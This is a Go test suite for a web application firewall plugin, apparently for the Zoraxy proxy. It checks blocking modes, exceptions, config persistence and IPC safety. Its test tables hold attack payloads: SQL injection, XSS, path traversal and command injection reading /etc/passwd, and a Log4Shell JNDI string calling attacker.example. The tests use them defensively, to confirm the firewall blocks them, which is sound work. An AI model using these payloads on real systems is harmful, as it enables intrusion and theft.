package service

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"zoraxy-waf-plugin/internal/config"
	"zoraxy-waf-plugin/internal/engine"
	"zoraxy-waf-plugin/internal/events"
	"zoraxy-waf-plugin/internal/wire"
)

// ---- helpers ----

func newSvc(t *testing.T, opts Options) *Service {
	t.Helper()
	if opts.DataDir == "" {
		opts.DataDir = t.TempDir()
	}
	s, err := New(opts)
	if err != nil {
		t.Fatalf("new service: %v", err)
	}
	t.Cleanup(s.Close)
	return s
}

func setMode(t *testing.T, s *Service, mode string, mut ...func(*config.Config)) {
	t.Helper()
	if _, err := s.Apply(func(c *config.Config) error {
		c.Mode = mode
		for _, m := range mut {
			m(c)
		}
		return nil
	}); err != nil {
		t.Fatalf("apply: %v", err)
	}
}

type payloadOpt func(*wire.InspectPayload)

func payload(method, uri string, body string, opts ...payloadOpt) wire.InspectPayload {
	p := wire.InspectPayload{
		SniffRequest: wire.SniffRequest{
			Method: method, Host: "shop.example", Hostname: "shop.example", RequestURI: uri, URL: uri,
			Proto: "HTTP/1.1", ProtoMajor: 1, ProtoMinor: 1, ClientIP: "203.0.113.10", RemoteAddr: "203.0.113.10:4000",
			Header: map[string][]string{
				"User-Agent":      {"Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"},
				"Accept":          {"text/html,application/xhtml+xml;q=0.9,*/*;q=0.8"},
				"Accept-Language": {"en-US,en;q=0.5"},
			},
		},
		Body: []byte(body), ProtocolVersion: 1, RouteID: "shop.example",
	}
	if body != "" {
		p.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
	}
	for _, o := range opts {
		o(&p)
	}
	return p
}

func withHost(h, route string) payloadOpt {
	return func(p *wire.InspectPayload) { p.Host, p.Hostname, p.RouteID = h, h, route }
}
func withCType(ct string) payloadOpt {
	return func(p *wire.InspectPayload) { p.Header["Content-Type"] = []string{ct} }
}
func truncated() payloadOpt { return func(p *wire.InspectPayload) { p.BodyTruncated = true } }

type ipcResp struct {
	code   int
	result wire.InspectResult
	raw    string
}

func callInspect(t *testing.T, s *Service, p wire.InspectPayload) ipcResp {
	t.Helper()
	b, _ := json.Marshal(p)
	req := httptest.NewRequest(http.MethodPost, "http://127.0.0.1:18482/inspect", bytes.NewReader(b))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	s.IPCHandler().ServeHTTP(rec, req)
	out := ipcResp{code: rec.Code, raw: rec.Body.String()}
	if rec.Code == 200 {
		if err := json.Unmarshal(rec.Body.Bytes(), &out.result); err != nil {
			t.Fatalf("invalid result JSON %q", rec.Body.String())
		}
	}
	return out
}

func q(s string) string { return url.QueryEscape(s) }

var attackQueries = map[string]string{
	"sqli-or":    "/search?id=" + q("1' OR 1=1-- -"),
	"sqli-union": "/search?id=" + q("1 UNION SELECT username,password FROM users"),
	"xss":        "/search?q=" + q("<script>alert(1)</script>"),
	"traversal":  "/download?file=" + q("../../../../etc/passwd"),
	"cmdi":       "/ping?host=" + q("127.0.0.1; cat /etc/passwd"),
	"log4shell":  "/search?q=" + q("${jndi:ldap://attacker.example/a}"),
}

var attackBodies = map[string]string{
	"sqli-or":    "id=" + q("1' OR 1=1-- -"),
	"sqli-union": "id=" + q("1 UNION SELECT username,password FROM users"),
	"xss":        "comment=" + q("<script>alert(1)</script>"),
	"traversal":  "file=" + q("../../../../etc/passwd"),
	"cmdi":       "host=" + q("127.0.0.1; cat /etc/passwd"),
	"log4shell":  "q=" + q("${jndi:ldap://attacker.example/a}"),
}

// ---- fake engine ----

type fakeEngine struct {
	calls    atomic.Int64
	closed   atomic.Bool
	inflight atomic.Int64
	err      error
	block    chan struct{}
	started  chan struct{}
	decision engine.Decision
	caps     engine.Capabilities
	onClose  func()
}

func (f *fakeEngine) Capabilities() engine.Capabilities {
	if f.caps.Name == "" {
		return engine.Capabilities{Name: "fake", RuleExclusions: true}
	}
	return f.caps
}
func (f *fakeEngine) Health() engine.Health { return engine.Health{OK: true, Detail: "fake"} }
func (f *fakeEngine) Close() error {
	if f.inflight.Load() != 0 {
		panic("engine closed while an inspection is in flight")
	}
	f.closed.Store(true)
	if f.onClose != nil {
		f.onClose()
	}
	return nil
}
func (f *fakeEngine) Inspect(ctx context.Context, r *engine.Request, o engine.Options) (engine.Decision, error) {
	f.inflight.Add(1)
	defer f.inflight.Add(-1)
	f.calls.Add(1)
	if f.started != nil {
		select {
		case f.started <- struct{}{}:
		default:
		}
	}
	if f.block != nil {
		<-f.block
	}
	return f.decision, f.err
}

// ---- tests ----

func TestFreshInstallIsOffAndServesDefaultPolicy(t *testing.T) {
	fe := &fakeEngine{}
	s := newSvc(t, Options{Build: func(config.Config) (engine.Engine, error) { return fe, nil }})
	r := callInspect(t, s, payload("GET", attackQueries["sqli-or"], ""))
	if r.code != 200 || r.result.Action != "allow" || fe.calls.Load() != 0 {
		t.Fatalf("off must allow without engine call: %+v calls=%d", r, fe.calls.Load())
	}
	req := httptest.NewRequest(http.MethodGet, "http://127.0.0.1:18482/policy", nil)
	rec := httptest.NewRecorder()
	s.IPCHandler().ServeHTTP(rec, req)
	want := `{"mode":"off","fail_closed":false,"invert_failure_hosts":[],"max_body_kb":64,"body_timeout_ms":5000,"hosts":{}}`
	if rec.Code != 200 || strings.TrimSpace(rec.Body.String()) != want || rec.Header().Get("Content-Type") != "application/json" {
		t.Fatalf("policy %d %s", rec.Code, rec.Body.String())
	}
	if st := s.Stats(); st.Skipped != 1 {
		t.Fatalf("skipped not counted: %+v", st)
	}
}

func TestReportModeNeverDeniesButRecordsWouldBlock(t *testing.T) {
	s := newSvc(t, Options{})
	setMode(t, s, config.ModeReport)
	for name, uri := range attackQueries {
		r := callInspect(t, s, payload("GET", uri, ""))
		if r.code != 200 || r.result.Action != "allow" || r.result.EventID == "" {
			t.Fatalf("%s: report must allow with event id: %+v", name, r)
		}
		ev, ok := s.Events().Get(r.result.EventID)
		if !ok || ev.Action != events.ActionWouldBlock || ev.Mode != "report" || len(ev.Matches) == 0 {
			t.Fatalf("%s: event %+v", name, ev)
		}
	}
	r := callInspect(t, s, payload("GET", "/products?page=2", ""))
	if r.result.Action != "allow" || r.result.EventID != "" {
		t.Fatalf("benign request: %+v", r)
	}
}

func TestBlockModeDeniesCRSAttacksGetAndPost(t *testing.T) {
	s := newSvc(t, Options{})
	setMode(t, s, config.ModeBlock)
	for name, uri := range attackQueries {
		r := callInspect(t, s, payload("GET", uri, ""))
		if r.result.Action != "deny" || r.result.Status != 403 || r.result.EventID == "" {
			t.Errorf("GET %s not denied: %+v", name, r)
		}
		if strings.Contains(r.raw, "passwd") || strings.Contains(r.raw, "script") || strings.Contains(r.raw, "jndi") {
			t.Errorf("GET %s: deny reason leaks request data: %s", name, r.raw)
		}
	}
	for name, body := range attackBodies {
		r := callInspect(t, s, payload("POST", "/submit", body))
		if r.result.Action != "deny" || r.result.Status != 403 {
			t.Errorf("POST %s not denied: %+v", name, r)
		}
		js, _ := json.Marshal(map[string]string{strings.SplitN(body, "=", 2)[0]: mustUnescape(strings.SplitN(body, "=", 2)[1])})
		r = callInspect(t, s, payload("POST", "/api", string(js), withCType("application/json")))
		if r.result.Action != "deny" {
			t.Errorf("JSON POST %s not denied: %+v", name, r)
		}
	}
	benign := []wire.InspectPayload{
		payload("GET", "/", ""),
		payload("GET", "/search?q="+q("garden chairs"), ""),
		payload("POST", "/login", "username=alice&password="+q("correct horse battery staple")),
		payload("POST", "/api/cart", `{"sku":"A-1","qty":3}`, withCType("application/json")),
	}
	for _, p := range benign {
		if r := callInspect(t, s, p); r.result.Action != "allow" {
			t.Errorf("benign %s %s denied: %+v", p.Method, p.RequestURI, r)
		}
	}
}

func mustUnescape(s string) string { v, _ := url.QueryUnescape(s); return v }

func TestHostOverridesAndRouteIDPrecedence(t *testing.T) {
	fe := &fakeEngine{decision: engine.Decision{Interrupted: true, Status: 403, Action: "deny"}}
	s := newSvc(t, Options{Build: func(config.Config) (engine.Engine, error) { return fe, nil }})
	setMode(t, s, config.ModeReport, func(c *config.Config) {
		c.Hosts = map[string]config.HostOverride{
			"shop.example":  {Mode: config.ModeBlock},
			"quiet.example": {Mode: config.ModeOff},
			"route-a":       {Mode: config.ModeBlock},
		}
	})
	if r := callInspect(t, s, payload("GET", "/", "", withHost("shop.example", ""))); r.result.Action != "deny" {
		t.Fatalf("host block override: %+v", r)
	}
	if r := callInspect(t, s, payload("GET", "/", "", withHost("other.example", ""))); r.result.Action != "allow" {
		t.Fatalf("global report: %+v", r)
	}
	before := fe.calls.Load()
	if r := callInspect(t, s, payload("GET", "/", "", withHost("quiet.example", ""))); r.result.Action != "allow" || fe.calls.Load() != before {
		t.Fatalf("host off must skip the engine: %+v", r)
	}
	if r := callInspect(t, s, payload("GET", "/", "", withHost("quiet.example", "route-a"))); r.result.Action != "deny" {
		t.Fatalf("route id must take precedence: %+v", r)
	}
}

func TestOversizedBodyPartialCoverage(t *testing.T) {
	s := newSvc(t, Options{})
	setMode(t, s, config.ModeReport)
	attack := payload("POST", "/submit", attackBodies["sqli-union"], truncated())
	r := callInspect(t, s, attack)
	if r.result.Action != "allow" || r.result.EventID == "" {
		t.Fatalf("report truncated attack: %+v", r)
	}
	ev, _ := s.Events().Get(r.result.EventID)
	if ev.Coverage != "partial" || ev.Action != events.ActionWouldBlock {
		t.Fatalf("event coverage: %+v", ev)
	}
	setMode(t, s, config.ModeBlock)
	if r := callInspect(t, s, attack); r.result.Action != "deny" || r.result.Status != 403 {
		t.Fatalf("block truncated attack: %+v", r)
	}
	r = callInspect(t, s, payload("POST", "/upload", "name=report&data="+strings.Repeat("a", 500), truncated()))
	if r.result.Action != "deny" || r.result.Status != 413 {
		t.Fatalf("block mode must not treat a clean prefix as a clean body: %+v", r)
	}
	ev, _ = s.Events().Get(r.result.EventID)
	if ev.Action != events.ActionOversize || ev.Coverage != "partial" {
		t.Fatalf("oversize event %+v", ev)
	}
}

func TestScopedExceptionsAndExpiry(t *testing.T) {
	now := time.Date(2026, 10, 2, 12, 0, 0, 0, time.UTC)
	var clock atomic.Pointer[time.Time]
	clock.Store(&now)
	s := newSvc(t, Options{Now: func() time.Time { return *clock.Load() }})
	setMode(t, s, config.ModeBlock)
	attack := payload("GET", "/search?q="+q("1' OR 1=1-- -"), "")
	r := callInspect(t, s, attack)
	if r.result.Action != "deny" {
		t.Fatal("precondition")
	}
	ev, _ := s.Events().Get(r.result.EventID)
	sugg := events.Suggest(ev)
	if len(sugg) == 0 {
		t.Fatal("no suggestions")
	}
	if _, err := s.Apply(func(c *config.Config) error {
		for i, sg := range sugg {
			c.Exceptions = append(c.Exceptions, config.Exception{ID: fmt.Sprintf("x%d", i), RuleID: sg.RuleID, Host: sg.Host,
				Method: sg.Method, Path: sg.Path, Argument: sg.Argument, Reason: "search false positive",
				CreatedAt: now, ExpiresAt: now.Add(time.Hour)})
		}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	r = callInspect(t, s, attack)
	if r.result.Action != "allow" {
		t.Fatalf("exceptions not applied: %+v", r)
	}
	other := payload("GET", "/other?q="+q("1' OR 1=1-- -"), "")
	if r := callInspect(t, s, other); r.result.Action != "deny" {
		t.Fatal("exception leaked to another path")
	}
	if r := callInspect(t, s, payload("GET", "/search?q="+q("1' OR 1=1-- -"), "", withHost("blog.example", "blog.example"))); r.result.Action != "deny" {
		t.Fatal("exception leaked to another host")
	}
	later := now.Add(2 * time.Hour)
	clock.Store(&later)
	if r := callInspect(t, s, attack); r.result.Action != "deny" {
		t.Fatal("expired exception still applied")
	}
}

func TestEngineErrorIsInspectionFailureNotVerdict(t *testing.T) {
	fe := &fakeEngine{err: errors.New("boom")}
	s := newSvc(t, Options{Build: func(config.Config) (engine.Engine, error) { return fe, nil }})
	setMode(t, s, config.ModeBlock)
	r := callInspect(t, s, payload("GET", "/", ""))
	if r.code != http.StatusServiceUnavailable {
		t.Fatalf("engine error must be a non-200 IPC failure so the core applies its failure policy: %+v", r)
	}
	if st := s.Stats(); st.Errors != 1 {
		t.Fatalf("errors not counted %+v", st)
	}
	if evs := s.Events().List(events.Filter{Action: events.ActionError}); len(evs) != 1 || evs[0].Error == "" {
		t.Fatalf("error event %+v", evs)
	}
}

func TestBoundedConcurrencySaturation(t *testing.T) {
	fe := &fakeEngine{block: make(chan struct{}), started: make(chan struct{}, 1)}
	s := newSvc(t, Options{Build: func(config.Config) (engine.Engine, error) { return fe, nil }})
	setMode(t, s, config.ModeBlock, func(c *config.Config) { c.MaxConcurrent = 1 })
	done := make(chan ipcResp)
	go func() { done <- callInspect(t, s, payload("GET", "/", "")) }()
	<-fe.started
	start := time.Now()
	r := callInspect(t, s, payload("GET", "/", ""))
	if r.code != http.StatusServiceUnavailable || time.Since(start) > time.Second {
		t.Fatalf("saturation must fail fast: %+v after %v", r, time.Since(start))
	}
	close(fe.block)
	if r := <-done; r.code != 200 {
		t.Fatalf("first request: %+v", r)
	}
	if st := s.Stats(); st.Saturated != 1 || fe.calls.Load() != 1 {
		t.Fatalf("saturation stats %+v calls=%d", st, fe.calls.Load())
	}
}

func TestApplyValidatesCompilesPersistsThenPublishes(t *testing.T) {
	dir := t.TempDir()
	var fail atomic.Bool
	builds := atomic.Int64{}
	s := newSvc(t, Options{DataDir: dir, Build: func(c config.Config) (engine.Engine, error) {
		builds.Add(1)
		if fail.Load() {
			return nil, errors.New("compile failed")
		}
		return &fakeEngine{}, nil
	}})
	setMode(t, s, config.ModeReport)
	cfgPath := filepath.Join(dir, "config.json")
	st, err := os.Stat(cfgPath)
	if err != nil || st.Mode().Perm() != 0o600 {
		t.Fatalf("config not persisted 0600: %v", err)
	}
	rev := s.Current().Revision
	before, _ := os.ReadFile(cfgPath)

	if _, err := s.Apply(func(c *config.Config) error { c.MaxBodyKB = 5000; return nil }); err == nil {
		t.Fatal("invalid config accepted")
	}
	fail.Store(true)
	if _, err := s.Apply(func(c *config.Config) error { c.Mode = config.ModeBlock; return nil }); err == nil {
		t.Fatal("compile failure accepted")
	}
	fail.Store(false)
	after, _ := os.ReadFile(cfgPath)
	if !bytes.Equal(before, after) || s.Current().Mode != config.ModeReport || s.Current().Revision != rev {
		t.Fatal("failed apply changed persisted or live config")
	}
	// Persist failure: replace the config file with a directory.
	os.Remove(cfgPath)
	os.Mkdir(cfgPath, 0o700)
	if _, err := s.Apply(func(c *config.Config) error { c.Mode = config.ModeBlock; return nil }); err == nil {
		t.Fatal("persist failure accepted")
	}
	if s.Current().Mode != config.ModeReport {
		t.Fatal("config published although persisting failed")
	}
	os.Remove(cfgPath)
	if _, err := s.Apply(func(c *config.Config) error { c.Mode = config.ModeBlock; return nil }); err != nil {
		t.Fatal(err)
	}
	if s.Current().Revision != rev+1 || s.Policy().Mode != "block" {
		t.Fatalf("revision/policy not advanced: %d %s", s.Current().Revision, s.Policy().Mode)
	}
}

func TestRestartLoadsPersistedConfigAndCorruptFileKeepsDefaultsVisible(t *testing.T) {
	dir := t.TempDir()
	s1, err := New(Options{DataDir: dir})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s1.Apply(func(c *config.Config) error {
		c.Mode = config.ModeBlock
		c.Hosts = map[string]config.HostOverride{"shop.example": {Mode: config.ModeReport, ParanoiaLevel: 2}}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	s1.Close()
	s2, err := New(Options{DataDir: dir})
	if err != nil {
		t.Fatal(err)
	}
	if s2.Current().Mode != config.ModeBlock || s2.Current().Hosts["shop.example"].ParanoiaLevel != 2 || s2.LoadError() != "" {
		t.Fatalf("restart lost config: %+v %s", s2.Current(), s2.LoadError())
	}
	s2.Close()

	os.WriteFile(filepath.Join(dir, "config.json"), []byte(`{"mode":`), 0o600)
	s3, err := New(Options{DataDir: dir})
	if err != nil {
		t.Fatal(err)
	}
	defer s3.Close()
	if s3.LoadError() == "" || s3.Current().Mode != config.ModeOff {
		t.Fatalf("corrupt config must be reported and not silently enforced: %q %s", s3.LoadError(), s3.Current().Mode)
	}
	if b, _ := os.ReadFile(filepath.Join(dir, "config.json")); string(b) != `{"mode":` {
		t.Fatal("corrupt config overwritten at startup")
	}
}

func TestSnapshotRetiresEngineOnlyAfterInFlightCompletes(t *testing.T) {
	var engines []*fakeEngine
	var mu sync.Mutex
	s := newSvc(t, Options{Build: func(config.Config) (engine.Engine, error) {
		fe := &fakeEngine{block: make(chan struct{}), started: make(chan struct{}, 1)}
		mu.Lock()
		engines = append(engines, fe)
		mu.Unlock()
		return fe, nil
	}})
	setMode(t, s, config.ModeReport)
	mu.Lock()
	old := engines[len(engines)-1]
	mu.Unlock()
	done := make(chan ipcResp)
	go func() { done <- callInspect(t, s, payload("GET", "/", "")) }()
	<-old.started
	setMode(t, s, config.ModeBlock)
	if old.closed.Load() {
		t.Fatal("engine closed while in flight")
	}
	close(old.block)
	<-done
	deadline := time.Now().Add(time.Second)
	for !old.closed.Load() && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	if !old.closed.Load() {
		t.Fatal("retired engine never closed")
	}
}

func TestConcurrentApplyAndInspectRace(t *testing.T) {
	s := newSvc(t, Options{Build: func(config.Config) (engine.Engine, error) {
		return &fakeEngine{decision: engine.Decision{Interrupted: true, Status: 403}}, nil
	}})
	setMode(t, s, config.ModeReport)
	var wg sync.WaitGroup
	stop := make(chan struct{})
	for i := 0; i < 8; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
				}
				r := callInspect(t, s, payload("GET", "/", ""))
				if r.code != 200 {
					t.Errorf("inspect failed during reload: %+v", r)
					return
				}
			}
		}()
	}
	for i := 0; i < 20; i++ {
		mode := config.ModeReport
		if i%2 == 0 {
			mode = config.ModeBlock
		}
		setMode(t, s, mode)
	}
	close(stop)
	wg.Wait()
}

func TestIPCHandlerRejectsBadRequests(t *testing.T) {
	s := newSvc(t, Options{})
	h := s.IPCHandler()
	do := func(method, target, host, body string) int {
		req := httptest.NewRequest(method, target, strings.NewReader(body))
		if host != "" {
			req.Host = host
		}
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, req)
		return rec.Code
	}
	if c := do("GET", "http://127.0.0.1:1/inspect", "", ""); c != http.StatusMethodNotAllowed {
		t.Errorf("GET /inspect = %d", c)
	}
	if c := do("POST", "http://127.0.0.1:1/policy", "", ""); c != http.StatusMethodNotAllowed {
		t.Errorf("POST /policy = %d", c)
	}
	if c := do("POST", "http://127.0.0.1:1/inspect", "", "{nope"); c != http.StatusBadRequest {
		t.Errorf("bad JSON = %d", c)
	}
	big := `{"method":"GET","request_uri":"/","body":"` + base64.StdEncoding.EncodeToString(make([]byte, 3<<20)) + `"}`
	if c := do("POST", "http://127.0.0.1:1/inspect", "", big); c != http.StatusRequestEntityTooLarge {
		t.Errorf("oversized = %d", c)
	}
	if c := do("GET", "http://127.0.0.1:1/policy", "attacker.example:18482", ""); c != http.StatusForbidden {
		t.Errorf("non-loopback Host (DNS rebinding) = %d", c)
	}
	if c := do("GET", "http://127.0.0.1:1/ui/api/state", "", ""); c != http.StatusNotFound {
		t.Errorf("admin API reachable through IPC handler = %d", c)
	}
}

func TestStatsLatencyAndHealth(t *testing.T) {
	s := newSvc(t, Options{})
	setMode(t, s, config.ModeBlock)
	callInspect(t, s, payload("GET", "/", ""))
	callInspect(t, s, payload("GET", attackQueries["xss"], ""))
	st := s.Stats()
	if st.Inspected != 2 || st.Allowed != 1 || st.Blocked != 1 || st.LatencyP95MS <= 0 {
		t.Fatalf("stats %+v", st)
	}
	h := s.Health()
	if !h.Engine.OK || h.Engine.RuleSet == "" || h.Revision == 0 || h.EngineName != "coraza" {
		t.Fatalf("health %+v", h)
	}
}
